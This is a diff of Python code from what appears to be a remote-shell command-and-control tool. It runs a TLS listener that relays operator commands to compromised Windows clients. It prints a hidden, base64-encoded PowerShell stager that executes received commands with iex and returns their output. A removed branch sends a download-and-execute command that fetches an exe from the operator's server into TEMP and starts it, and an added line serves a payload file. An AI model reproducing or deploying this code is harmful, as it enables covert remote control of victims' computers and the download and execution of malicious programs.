@@ -59,18 +59,18 @@ def startClientListener():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256", certfile="server.crt", keyfile="server.key", server_side=True)
     except:
-        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal + '\n>')
+        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal + '\n> ')
         sys.stdout.flush()
         sys.exit(1)
     try:
         ws.bind((FUNCTIONS().CheckInternet(), 5555))
         ws.listen(30)
     except:
-        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Port in use" + t.normal + '\n>')
+        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Port in use" + t.normal + '\n> ')
         sys.stdout.flush()
         sys.exit(1)
 
-    sys.stdout.write('\r' + t.bold_red + "listening on port 5555" + t.normal + '\n>')
+    sys.stdout.write('\r' + t.bold_red + "listening on port 5555" + t.normal + '\n> ')
     sys.stdout.flush()
     clientnumber = 0
 
@@ -80,7 +80,7 @@ def startClientListener():
 
         if clientconn:
             clientnumber += 1
-            sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal + '\n>')
+            sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal + '\n> ')
             sys.stdout.flush()
 
             worker = Thread(target=pingClients, args=(clientconn,clientnumber))
@@ -96,10 +96,10 @@ def startClientListener():
 def interactShell(clientconn,clientnumber):
     from menu import clientMenuOptions
     print "Commands\n" + "-"*24 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*24
-    if clientconn in select.select([clientconn], [], [], 0.5)[0]:
-        clientconn.recv(1024)
 
     while True:
+        if clientconn in select.select([clientconn], [], [], 0.2)[0]:
+            clientconn.recv(1024)
         command = raw_input("PS > ")
         if command == "back":
             break
@@ -110,12 +110,13 @@ def interactShell(clientconn,clientnumber):
                 print t.bold_red + "Client Connection Killed" + t.normal
                 del clientMenuOptions[str(clientnumber)]
                 clientconn.close()
+                time.sleep(2)
             break
         else:
             clientconn.sendall(command)
 
         while True:
-            data = clientconn.recv(1)
+            data = clientconn.recv(1).rstrip('\r')
             sys.stdout.write(data)
             sys.stdout.flush()
             if data == "\x00":
@@ -134,14 +135,6 @@ def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
 
         clientconn.sendall(powershellExec)
 
-    else:
-        print type(fileToUpload)
-        fileToUpload += '.exe'
-        print t.bold_green + "[*] Starting Transfer" + t.normal
-        ipaddr = FUNCTIONS().CheckInternet()
-        FUNCTIONS().DoServe(ipaddr,fileToUpload,os.path.dirname(fileToUpload), port=8800)
-        clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8800/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 25;Start-Process \"$Env:TEMP\\temp.exe\"")
-
 def printListener():
     windows_powershell_stager = (
         "cd ($env:SystemDrive + '\\');"
@@ -155,8 +148,9 @@ def printListener():
         "if($d.length -gt 0){"
         "$cb = (iex -c $d 2>&1 | Out-String);"
         "$br = $cb + ($error[0] | Out-String) + \"\x00\";$error.clear();"
-        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()}};$c.Close();Exit")
+        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()}};break")
 
+    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), 'p.ps1', payloaddir(), port=8000, printIt = False)
     print 'powershell.exe -WindowStyle Hidden -NonInteractive -enc ' + windows_powershell_stager.encode('utf_16_le').encode('base64').replace('\n','')
     return "pass"
 
